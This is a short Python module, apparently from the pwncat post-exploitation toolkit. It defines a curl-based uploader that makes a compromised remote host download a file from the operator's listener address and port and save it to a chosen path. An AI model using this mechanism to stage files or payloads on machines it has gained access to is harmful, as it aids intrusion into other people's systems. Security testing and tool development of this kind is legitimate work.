#!/usr/bin/env python3
from typing import Generator
import shlex

from pwncat.uploader.base import HTTPUploader


class CurlUploader(HTTPUploader):

    NAME = "curl"
    BINARIES = ["curl"]

    def command(self) -> Generator[str, None, None]:
        """ Generate the curl command to post the file """

        lhost = self.pty.vars["lhost"]
        lport = self.server.server_address[1]
        curl = self.pty.which("curl")
        remote_path = shlex.quote(self.remote_path)

        self.pty.run(
            f"{curl} --output {remote_path} http://{lhost}:{lport}", wait=False
        )
